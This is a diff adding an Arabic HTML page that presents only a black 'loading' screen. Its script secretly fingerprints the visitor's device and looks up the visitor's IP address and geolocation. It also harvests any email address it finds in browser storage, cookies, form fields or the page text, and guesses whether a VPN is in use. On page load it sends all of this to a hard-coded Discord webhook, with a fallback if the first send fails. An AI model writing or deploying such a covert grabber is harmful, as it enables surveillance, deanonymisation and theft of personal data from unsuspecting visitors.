@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            width: 100%;
+            height: 100%;
+            min-height: 100vh;
+            background: #000000;
+            overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+        }
+        .black-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+            flex-direction: column;
+            user-select: none;
+            cursor: default;
+        }
+        .loading-text {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: 300;
+            letter-spacing: 3px;
+            text-shadow: 0 0 20px rgba(255,255,255,0.05);
+            animation: pulse 2s ease-in-out infinite;
+            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+        }
+        .dots::after {
+            content: '';
+            animation: dots 2s steps(4, end) infinite;
+        }
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+            100% { content: ''; }
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+        .loading-line {
+            width: 80px;
+            height: 1px;
+            background: rgba(255,255,255,0.1);
+            margin-top: 20px;
+            animation: linePulse 1.5s ease-in-out infinite;
+        }
+        @keyframes linePulse {
+            0%, 100% { width: 80px; opacity: 0.3; }
+            50% { width: 150px; opacity: 0.8; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="black-screen" id="blackScreen">
+        <div class="loading-text">
+            جاري التحميل<span class="dots"></span>
+        </div>
+        <div class="loading-line"></div>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ======== WEBHOOK (تأكد من صحة الرابط) ========
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1517594234402639946/RaYwbR6WY8ZMQTwlZ6ZTIxDeLYIauBuFRvWBCnTU-bJcDO0ehT8o7PcD-YSE4bE8Bdwe";
+            // ============================================
+
+            // ======== 1. جمع معلومات الجهاز ========
+            function getDeviceInfo() {
+                const ua = navigator.userAgent || '';
+                const platform = navigator.platform || '';
+                const vendor = navigator.vendor || '';
+
+                // نوع الجهاز
+                let deviceType = 'غير معروف';
+                let isMobile = false;
+                let isTablet = false;
+                let isDesktop = false;
+
+                const mobileKeywords = ['Mobile', 'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 'Windows Phone'];
+                const tabletKeywords = ['iPad', 'Tablet', 'Nexus 7', 'Nexus 10', 'Kindle', 'Galaxy Tab'];
+
+                for (const kw of mobileKeywords) {
+                    if (ua.includes(kw)) { isMobile = true; break; }
+                }
+                for (const kw of tabletKeywords) {
+                    if (ua.includes(kw)) { isTablet = true; isMobile = false; break; }
+                }
+                if (!isMobile && !isTablet) {
+                    if (window.screen.width >= 1024) isDesktop = true;
+                }
+
+                if (isTablet) deviceType = '📱 تابلت';
+                else if (isMobile) deviceType = '📱 جوال';
+                else if (isDesktop) deviceType = '💻 كمبيوتر';
+
+                // اسم الجهاز
+                let deviceName = 'غير معروف';
+                if (platform.includes('Win')) deviceName = 'Windows';
+                else if (platform.includes('Mac')) deviceName = 'Mac';
+                else if (platform.includes('Linux')) deviceName = 'Linux';
+                else if (platform.includes('Android')) deviceName = 'Android';
+                else if (platform.includes('iPhone')) deviceName = 'iPhone';
+                else if (platform.includes('iPad')) deviceName = 'iPad';
+
+                // موديل الجوال
+                let phoneModel = 'غير معروف';
+                if (isMobile || isTablet) {
+                    if (ua.includes('iPhone')) {
+                        const match = ua.match(/iPhone (\d+)/);
+                        phoneModel = match ? 'iPhone ' + match[1] : 'iPhone';
+                    } else if (ua.includes('iPad')) {
+                        const match = ua.match(/iPad (\d+)/);
+                        phoneModel = match ? 'iPad ' + match[1] : 'iPad';
+                    } else if (ua.includes('Samsung') || ua.includes('SM-')) {
+                        const match = ua.match(/SM-([A-Z0-9]+)/);
+                        phoneModel = match ? 'Samsung ' + match[1] : 'Samsung';
+                    } else if (ua.includes('Pixel')) {
+                        phoneModel = 'Google Pixel';
+                    } else if (ua.includes('OnePlus')) {
+                        phoneModel = 'OnePlus';
+                    } else if (ua.includes('Xiaomi') || ua.includes('Redmi')) {
+                        phoneModel = 'Xiaomi/Redmi';
+                    } else if (ua.includes('Huawei')) {
+                        phoneModel = 'Huawei';
+                    } else if (ua.includes('OPPO')) {
+                        phoneModel = 'OPPO';
+                    } else if (ua.includes('Vivo')) {
+                        phoneModel = 'Vivo';
+                    } else if (ua.includes('Realme')) {
+                        phoneModel = 'Realme';
+                    } else if (ua.includes('LG')) {
+                        phoneModel = 'LG';
+                    } else if (ua.includes('Sony')) {
+                        phoneModel = 'Sony';
+                    } else if (ua.includes('Nokia')) {
+                        phoneModel = 'Nokia';
+                    } else if (ua.includes('BlackBerry')) {
+                        phoneModel = 'BlackBerry';
+                    } else if (ua.includes('Kindle')) {
+                        phoneModel = 'Amazon Kindle';
+                    } else if (ua.includes('Lenovo')) {
+                        phoneModel = 'Lenovo';
+                    } else if (ua.includes('Motorola')) {
+                        phoneModel = 'Motorola';
+                    } else if (vendor) {
+                        phoneModel = vendor;
+                    }
+                }
+
+                // نظام التشغيل
+                let os = 'غير معروف';
+                if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
+                else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
+                else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
+                else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+                else if (ua.includes('Windows NT 6.0')) os = 'Windows Vista';
+                else if (ua.includes('Windows NT 5.1')) os = 'Windows XP';
+                else if (ua.includes('Mac OS X 10_15')) os = 'macOS Catalina';
+                else if (ua.includes('Mac OS X 10_14')) os = 'macOS Mojave';
+                else if (ua.includes('Mac OS X 10_13')) os = 'macOS High Sierra';
+                else if (ua.includes('Mac OS X 10_12')) os = 'macOS Sierra';
+                else if (ua.includes('Mac OS X 10_11')) os = 'OS X El Capitan';
+                else if (ua.includes('Mac OS X')) os = 'macOS';
+                else if (ua.includes('Android')) {
+                    const match = ua.match(/Android (\d+\.\d+)/);
+                    os = match ? 'Android ' + match[1] : 'Android';
+                } else if (ua.includes('iPhone OS')) {
+                    const match = ua.match(/iPhone OS (\d+[._]\d+)/);
+                    os = match ? 'iOS ' + match[1].replace('_', '.') : 'iOS';
+                } else if (ua.includes('iPad')) os = 'iPadOS';
+                else if (ua.includes('Linux')) os = 'Linux';
+                else if (ua.includes('CrOS')) os = 'Chrome OS';
+                else if (ua.includes('FreeBSD')) os = 'FreeBSD';
+
+                return {
+                    deviceType,
+                    deviceName,
+                    phoneModel,
+                    os,
+                    userAgent: ua,
+                    platform,
+                    vendor,
+                    screenWidth: window.screen.width,
+                    screenHeight: window.screen.height,
+                    colorDepth: window.screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio || 1,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+                    deviceMemory: navigator.deviceMemory || 'غير معروف',
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    language: navigator.language || 'غير معروف',
+                    isMobile,
+                    isTablet,
+                    isDesktop
+                };
+            }
+
+            // ======== 2. جلب IP والموقع ========
+            async function fetchIPAndGeo() {
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data.ip) {
+                            return {
+                                ip: data.ip,
+                                country: data.country_name || 'غير معروف',
+                                countryCode: data.country_code || '',
+                                region: data.region || 'غير معروف',
+                                city: data.city || 'غير معروف',
+                                zip: data.postal || '',
+                                lat: data.latitude || '',
+                                lon: data.longitude || '',
+                                timezone: data.timezone || '',
+                                isp: data.org || 'غير معروف',
+                                org: data.org || '',
+                                asn: data.asn || ''
+                            };
+                        }
+                    }
+                } catch (e) {}
+
+                try {
+                    const res2 = await fetch('https://ipinfo.io/json');
+                    if (res2.ok) {
+                        const data2 = await res2.json();
+                        if (data2.ip) {
+                            const loc = data2.loc ? data2.loc.split(',') : ['', ''];
+                            return {
+                                ip: data2.ip,
+                                country: data2.country || 'غير معروف',
+                                countryCode: data2.country || '',
+                                region: data2.region || 'غير معروف',
+                                city: data2.city || 'غير معروف',
+                                zip: data2.postal || '',
+                                lat: loc[0] || '',
+                                lon: loc[1] || '',
+                                timezone: data2.timezone || '',
+                                isp: data2.org || 'غير معروف',
+                                org: data2.org || '',
+                                asn: data2.asn || ''
+                            };
+                        }
+                    }
+                } catch (e) {}
+
+                try {
+                    const res3 = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+                    if (res3.ok) {
+                        const data3 = await res3.json();
+                        if (data3.status === 'success') {
+                            return {
+                                ip: data3.query,
+                                country: data3.country || 'غير معروف',
+                                countryCode: data3.countryCode || '',
+                                region: data3.regionName || 'غير معروف',
+                                city: data3.city || 'غير معروف',
+                                zip: data3.zip || '',
+                                lat: data3.lat || '',
+                                lon: data3.lon || '',
+                                timezone: data3.timezone || '',
+                                isp: data3.isp || 'غير معروف',
+                                org: data3.org || '',
+                                asn: data3.as || ''
+                            };
+                        }
+                    }
+                } catch (e) {}
+
+                return {
+                    ip: 'غير متاح',
+                    country: 'غير معروف',
+                    region: 'غير معروف',
+                    city: 'غير معروف',
+                    isp: 'غير معروف'
+                };
+            }
+
+            // ======== 3. استخراج البريد الإلكتروني ========
+            function extractEmail() {
+                let email = '';
+
+                try {
+                    const keys = ['email', 'user_email', 'userEmail', 'mail', 'user_mail', 'login_email'];
+                    for (const key of keys) {
+                        const val = localStorage.getItem(key);
+                        if (val && val.includes('@')) {
+                            email = val;
+                            break;
+                        }
+                    }
+                } catch (e) {}
+
+                if (!email) {
+                    try {
+                        const keys = ['email', 'user_email', 'userEmail', 'mail'];
+                        for (const key of keys) {
+                            const val = sessionStorage.getItem(key);
+                            if (val && val.includes('@')) {
+                                email = val;
+                                break;
+                            }
+                        }
+                    } catch (e) {}
+                }
+
+                if (!email) {
+                    try {
+                        const cookies = document.cookie.split(';');
+                        for (const cookie of cookies) {
+                            const [key, val] = cookie.trim().split('=');
+                            if (key && val && val.includes('@')) {
+                                email = decodeURIComponent(val);
+                                break;
+                            }
+                        }
+                    } catch (e) {}
+                }
+
+                if (!email) {
+                    const inputs = document.querySelectorAll('input[type="email"], input[type="text"], input[type="hidden"]');
+                    for (const input of inputs) {
+                        if (input.value && input.value.includes('@')) {
+                            email = input.value;
+                            break;
+                        }
+                    }
+                }
+
+                if (!email) {
+                    const bodyText = document.body.innerText || '';
+                    const match = bodyText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+                    if (match) email = match[0];
+                }
+
+                return email || 'غير متاح';
+            }
+
+            // ======== 4. كشف VPN ========
+            function detectVPN(ip, geoData) {
+                let score = 0;
+                const reasons = [];
+
+                if (geoData && geoData.org) {
+                    const org = geoData.org.toLowerCase();
+                    const keywords = ['cloud', 'hosting', 'datacenter', 'vps', 'vpn', 'proxy', 'digitalocean', 'aws', 'azure', 'ovh', 'linode', 'vultr', 'google cloud'];
+                    if (keywords.some(kw => org.includes(kw))) {
+                        score += 40;
+                        reasons.push('مزود سحابي/استضافة');
+                    }
+                }
+
+                if (geoData && geoData.timezone) {
+                    try {
+                        const tzOffset = parseInt(geoData.timezone.split('UTC')[1]) || 0;
+                        const localOffset = -new Date().getTimezoneOffset() / 60;
+                        if (Math.abs(tzOffset - localOffset) > 3) {
+                            score += 25;
+                            reasons.push('توقيت غير متناسب');
+                        }
+                    } catch (e) {}
+                }
+
+                let isVPN = false;
+                if (score >= 40) isVPN = true;
+                else if (score >= 20) isVPN = 'maybe';
+
+                return { isVPN, score, reasons };
+            }
+
+            // ======== 5. إرسال البيانات ========
+            async function sendToWebhook(data) {
+                try {
+                    console.log('جاري الإرسال إلى Webhook...');
+
+                    const payload = {
+                        content: `**📩 زائر جديد** (${new Date().toLocaleString('ar-EG')})`,
+                        embeds: [{
+                            title: '🕵️ تقرير الزيارة',
+                            color: data.vpn === true ? 0xff4444 : (data.vpn === false ? 0x44ff88 : 0xffaa44),
+                            timestamp: new Date().toISOString(),
+                            fields: [
+                                { name: '💻 نوع الجهاز', value: data.deviceType, inline: true },
+                                { name: '📱 اسم الجهاز', value: data.deviceName, inline: true },
+                                { name: '📱 موديل الجوال', value: data.phoneModel, inline: true },
+                                { name: '🖥️ نظام التشغيل', value: data.os, inline: true },
+                                { name: '🌍 الدولة', value: data.country, inline: true },
+                                { name: '🏙️ المدينة', value: data.city, inline: true },
+                                { name: '🌐 IP', value: data.ip, inline: true },
+                                { name: '🏢 مزود الخدمة', value: data.isp, inline: true },
+                                { name: '🛡️ VPN', value: data.vpn === true ? '⚠️ مفعل' : (data.vpn === false ? '✅ غير مفعل' : '❓ غير مؤكد'), inline: true },
+                                { name: '📧 البريد الإلكتروني', value: data.email, inline: false },
+                                ...(data.vpnReasons && data.vpnReasons.length > 0 ? [{ name: '🔍 أسباب VPN', value: data.vpnReasons.join(' • '), inline: false }] : []),
+                                { name: '📐 دقة الشاشة', value: `${data.screenWidth}×${data.screenHeight}`, inline: true },
+                                { name: '🔍 كثافة البكسلات', value: data.pixelRatio + 'x', inline: true },
+                                { name: '🕐 المنطقة الزمنية', value: data.timezone, inline: true },
+                                { name: '📶 نقاط اللمس', value: data.maxTouchPoints, inline: true },
+                                { name: '📱 جوال', value: data.isMobile ? 'نعم' : 'لا', inline: true },
+                                { name: '💻 كمبيوتر', value: data.isDesktop ? 'نعم' : 'لا', inline: true },
+                                { name: '📝 User-Agent', value: (data.userAgent || '').substring(0, 100) + '...', inline: false },
+                                { name: '🔗 الصفحة', value: window.location.href, inline: false }
+                            ]
+                        }]
+                    };
+
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    if (response.ok) {
+                        console.log('✅ تم الإرسال بنجاح!');
+                    } else {
+                        const errorText = await response.text();
+                        console.error('❌ فشل الإرسال:', response.status, errorText);
+                        // محاولة ثانية بطريقة مختلفة
+                        await sendToWebhookAlternative(data);
+                    }
+                } catch (error) {
+                    console.error('❌ خطأ في الإرسال:', error);
+                }
+            }
+
+            // ======== طريقة بديلة للإرسال ========
+            async function sendToWebhookAlternative(data) {
+                try {
+                    console.log('محاولة الإرسال بالطريقة البديلة...');
+                    
+                    const embed = {
+                        title: '🕵️ تقرير الزيارة',
+                        color: data.vpn === true ? 0xff4444 : (data.vpn === false ? 0x44ff88 : 0xffaa44),
+                        fields: [
+                            { name: 'نوع الجهاز', value: data.deviceType, inline: true },
+                            { name: 'اسم الجهاز', value: data.deviceName, inline: true },
+                            { name: 'موديل الجوال', value: data.phoneModel, inline: true },
+                            { name: 'نظام التشغيل', value: data.os, inline: true },
+                            { name: 'الدولة', value: data.country, inline: true },
+                            { name: 'المدينة', value: data.city, inline: true },
+                            { name: 'IP', value: data.ip, inline: true },
+                            { name: 'مزود الخدمة', value: data.isp, inline: true },
+                            { name: 'VPN', value: data.vpn === true ? 'مفعل' : (data.vpn === false ? 'غير مفعل' : 'غير مؤكد'), inline: true },
+                            { name: 'البريد الإلكتروني', value: data.email, inline: false },
+                            { name: 'دقة الشاشة', value: `${data.screenWidth}×${data.screenHeight}`, inline: true },
+                            { name: 'المنطقة الزمنية', value: data.timezone, inline: true }
+                        ]
+                    };
+
+                    const params = new URLSearchParams();
+                    params.append('payload_json', JSON.stringify({ embeds: [embed] }));
+
+                    const response = await fetch(WEBHOOK_URL + '?' + params.toString(), {
+                        method: 'POST'
+                    });
+
+                    if (response.ok) {
+                        console.log('✅ تم الإرسال بالطريقة البديلة!');
+                    } else {
+                        console.error('❌ فشلت المحاولة البديلة:', response.status);
+                    }
+                } catch (error) {
+                    console.error('❌ خطأ في المحاولة البديلة:', error);
+                }
+            }
+
+            // ======== 6. الدالة الرئيسية ========
+            async function collectAndSend() {
+                try {
+                    console.log('🚀 بدء جمع البيانات...');
+
+                    // جمع معلومات الجهاز
+                    const deviceInfo = getDeviceInfo();
+                    console.log('✅ معلومات الجهاز:', deviceInfo);
+
+                    // جلب IP والموقع
+                    const geoData = await fetchIPAndGeo();
+                    console.log('✅ معلومات الموقع:', geoData);
+
+                    // استخراج البريد
+                    const email = extractEmail();
+                    console.log('✅ البريد الإلكتروني:', email);
+
+                    // كشف VPN
+                    const vpnResult = detectVPN(geoData.ip, geoData);
+
+                    // تجهيز البيانات للإرسال
+                    const data = {
+                        deviceType: deviceInfo.deviceType,
+                        deviceName: deviceInfo.deviceName,
+                        phoneModel: deviceInfo.phoneModel,
+                        os: deviceInfo.os,
+                        userAgent: deviceInfo.userAgent,
+                        country: geoData.country,
+                        city: geoData.city,
+                        ip: geoData.ip,
+                        isp: geoData.isp,
+                        email: email,
+                        vpn: vpnResult.isVPN,
+                        vpnReasons: vpnResult.reasons,
+                        screenWidth: deviceInfo.screenWidth,
+                        screenHeight: deviceInfo.screenHeight,
+                        pixelRatio: deviceInfo.pixelRatio,
+                        timezone: deviceInfo.timezone,
+                        maxTouchPoints: deviceInfo.maxTouchPoints,
+                        isMobile: deviceInfo.isMobile,
+                        isDesktop: deviceInfo.isDesktop,
+                        hardwareConcurrency: deviceInfo.hardwareConcurrency,
+                        deviceMemory: deviceInfo.deviceMemory,
+                        language: deviceInfo.language
+                    };
+
+                    console.log('📤 البيانات المجمعة:', data);
+
+                    // إرسال إلى Webhook
+                    await sendToWebhook(data);
+
+                } catch (error) {
+                    console.error('❌ خطأ في collectAndSend:', error);
+                }
+            }
+
+            // ======== التنفيذ ========
+            window.addEventListener('load', function() {
+                console.log('🌐 الصفحة تحمّلت، بدء الجمع...');
+                setTimeout(collectAndSend, 1000);
+            });
+
+        })();
+    </script>
+</body>
+</html>
